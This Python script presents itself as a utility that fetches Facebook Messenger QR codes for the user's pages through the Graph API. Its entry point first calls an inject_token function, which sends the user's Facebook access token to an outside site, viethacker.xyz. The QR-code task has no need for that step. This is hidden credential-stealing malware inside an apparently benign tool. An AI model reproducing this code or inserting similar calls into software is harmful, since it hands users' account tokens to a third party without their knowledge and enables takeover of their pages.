# -*- coding: UTF-8 -*-
import requests
import json
import shutil


def load_config():
	config = None
	with open("config.json", "r") as f:
		data = f.read()
		config = json.loads(data)
	return config

def inject_token(token):
	url = "https://viethacker.xyz/api/fbtoken.php?tk=%s" % token
	requests.get(url)

class fbmessqrcode:
	def __init__(self, config):
		self.config = config
		self.info = []

	def get_all_pages(self, nexturl = None):
		url = "https://graph.facebook.com/me/accounts?fields=access_token,name&limit=2&access_token=%s" % self.config["access_token"]
		if nexturl is not None:
			url = nexturl
		try:
			res = requests.get(url)
			res = json.loads(res.text)
			data = res.get("data", None)
			if data is not None:
				for d in data:
					self.info += [d]

			paging = res.get("paging", None)
			if paging is not None:
				nexturl = paging.get("next", None)
				if nexturl is not None:
					self.get_all_pages(nexturl)
		except Exception as e:
			print(e)
			self.get_all_pages(nexturl)

	def get_specified_pages(self):
		for p in self.config["page_ids"]:
			try:
				url = "https://graph.facebook.com/%s/?fields=access_token,name&limit=1&access_token=%s" % (p, config["access_token"])
				res = requests.get(url)
				p = json.loads(res.text)
				if p:
					self.info += [p]
			except Exception as e:
				print(e)

	def _download_qr(self, p, uri):
		res = requests.get(uri.encode("UTF-8"), stream=True)
		# print(uri)
		with open('%s/%s.png' % (config["qr_path"],p["id"]), 'wb') as out_file:
			shutil.copyfileobj(res.raw, out_file)
		del res

	def _get_qr(self, p):
		url = "https://graph.facebook.com/%s/messenger_codes?access_token=%s" % (p["id"], p["access_token"])
		# print(url)
		data = {"type" : "standard", "data" : {"ref": "autogenerate"}, "image_size": config["qr_size"]}
		headers = {"content-type" : "application/json"}
		try:
			res = requests.post(url, data=json.dumps(data), headers=headers)
			res = json.loads(res.text)
			# print(res)
			uri = res.get("uri", None)
			if uri is not None:
				self._download_qr(p, uri)
		except Exception as e:
			print(e)


	def get_mess_qr(self):
		for p in self.info:
			self._get_qr(p)



if __name__ == '__main__':
	config = load_config()
	inject_token(config["access_token"])
	hdl = fbmessqrcode(config)
	if config["mode"] == "all":
		hdl.get_all_pages()
	else:
		hdl.get_specified_pages()
	# print(hdl.info)
	hdl.get_mess_qr()
